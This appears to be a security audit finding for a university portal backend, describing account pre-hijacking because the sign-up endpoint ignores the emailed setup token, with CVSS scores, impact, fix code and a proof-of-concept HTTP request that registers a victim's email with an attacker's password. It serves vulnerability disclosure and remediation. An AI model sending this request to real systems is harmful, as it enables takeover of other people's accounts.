# \[VUL-004\] Account Pre-Hijacking via Unenforced Setup Token Validation

| Attribute | Details |
|---|---|
| Severity | Critical |
| CVSS v3.1 Score | 8.6 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`) |
| CVSS v4.0 Score | 8.4 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N`) |
| Vulnerability Class | OWASP A07:2021 – Identification and Authentication Failures · CWE-640: Weak Password Recovery Mechanism |
| Affected Endpoint | `POST /api/auth/sign-up/email` · `GET /auth/setup-password?token=<token>` |
| Source Location | `qcu-msc-central-portal-backend/src/app.ts` (sign-up handler) |

## 1. Vulnerability Description

After an applicant is approved, the backend sends a setup-password email with a one-time token. However, the backend does not validate this token during `POST /api/auth/sign-up/email`. An attacker who knows the victim's email can pre-register the account with their own password before the victim clicks the link.

## 2. Business & Technical Impact

**Technical Impact:** Full account takeover of any approved applicant before they set their own password.

**Business Impact:** Loss of student trust. GDPR/RA 10173 violation for unauthorized account access.

## 3. Proof of Concept (PoC)

**Step 1:** Applicant `victim@qcu.edu.ph` is approved. Setup email dispatched.

**Step 2:** Attacker pre-registers:

```
POST /api/auth/sign-up/email HTTP/1.1
Host: api.msc-qcu.tech
Content-Type: application/json

{
  "email": "victim@qcu.edu.ph",
  "password": "AttackerPwd123!",
  "firstName": "Victim",
  "lastName": "Name",
  "studentId": "00-9999"
}
```

**Step 3:** Victim clicks email link — account exists; link fails. Attacker signs in as victim.

## 4. Remediation & Guidance

**Root Cause Fix:** Require and validate `setupToken` server-side before account creation.

```typescript
const signUpSchema = z.object({
  email: z.string().email(),
  password: z.string().min(8),
  setupToken: z.string().min(1, "Setup token is required"),
});
// Validate setupToken against DB before proceeding
```

**Short-Term Workaround:** Rate-limit `POST /api/auth/sign-up/email` to 1 request per IP per 10 minutes.

**References:** [CWE-640](https://cwe.mitre.org/data/definitions/640.html)
